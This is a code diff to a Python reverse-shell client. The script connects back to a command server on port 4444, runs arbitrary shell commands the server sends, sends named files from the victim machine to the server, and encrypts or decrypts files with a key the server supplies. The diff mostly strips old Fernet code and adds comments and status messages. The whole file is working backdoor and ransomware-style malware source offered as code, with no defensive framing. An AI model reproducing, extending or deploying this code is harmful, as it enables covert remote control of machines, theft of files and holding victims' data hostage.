@@ -2,8 +2,6 @@ import socket
 import os
 import subprocess
 import sys
-from cryptography import fernet
-from cryptography.fernet import Fernet
 from Crypto.Cipher import AES
 
 SERVER_HOST = "10.0.1.24"
@@ -11,9 +9,6 @@ SERVER_HOST = "10.0.1.24"
 SERVER_PORT = 4444
 BUFFER_SIZE = 1024
 SEPARATOR = "<sep>"
-
-#key = Fernet.generate_key()
-#fer = Fernet(key)
 
 def crypt_file(file_path, k, isEncrypted) :
     
@@ -38,31 +33,6 @@ def crypt_file(file_path, k, isEncrypted) :
         with open(file_path, "wb") as fo:
             fo.write(data)
 
-    
-#with open(file_path, 'wb') as fp:
-#    fp.write(_data)
-
-"""
-def encrypt_file(file_path) :
-    
-    with open(file_path, 'rb') as f:
-        data = f.read()
-        _data = fer.encrypt(data)
-        print(_data)
-    
-    with open(file_path, 'wb') as fp:
-        fp.write(_data)
-    
-
-def decrypt_file(file_path) :
-    with open(file_path, 'rb') as f:
-        data = f.read()
-        _data = fer.decrypt(data)
-        print(_data)
-    
-    with open(file_path, 'wb') as fp:
-        fp.write(_data)
-"""
 s = socket.socket()
 s.connect((SERVER_HOST, SERVER_PORT))
 
@@ -78,6 +48,7 @@ while True:
         break
     if splitted_command[0].lower() == "cd":
         try:
+            # Change directory accoring to the command
             os.chdir(' '.join(splitted_command[1:]))
         except FileNotFoundError as e:
             output = str(e)
@@ -87,13 +58,13 @@ while True:
         file_name = splitted_command[1]
         
         try:
+            # Send file size to server, needed for writing
             file_size = os.path.getsize(file_name)
-        
             s.send(str(file_size).encode())
             
-            #print("Sending file...")
+            # Read data from the file in blocks
+            # File of any size can then be sent
             content = open(file_name, "rb")
-
             some_data = content.read(BUFFER_SIZE)
             while some_data :
                 s.send(some_data)
@@ -107,25 +78,25 @@ while True:
             output = ""
     elif splitted_command[0].lower() == "encrypt":
         file_name = splitted_command[1]
+        # Sending confirmation to server...
         s.send("1".encode())
+        # Receiving symmetric key
         key = s.recv(BUFFER_SIZE)
         crypt_file(file_name, key, False)
-        #s.send(key)
         s.recv(BUFFER_SIZE)
-        output = ""
+        output = "File has been encrypted"
     elif splitted_command[0].lower() == "decrypt":
         file_name = splitted_command[1]
+        # Sending confirmation to server...
         s.send("1".encode())
+        # Receiving symmetric key
         key = s.recv(BUFFER_SIZE)
         crypt_file(file_name, key, True) #is encrypted, want to decrypt
         s.recv(BUFFER_SIZE)
-        #decrypt_file(file_name)
-        #s.send(key)
-        #s.recv(BUFFER_SIZE)
-        output = ""
+        output = "File has been decrypted"
     else:
         output = subprocess.getoutput(command)
-    #print(s.)
+    
     cwd = os.getcwd()
     message = f"{output}{SEPARATOR}{cwd}"
     s.send(message.encode())
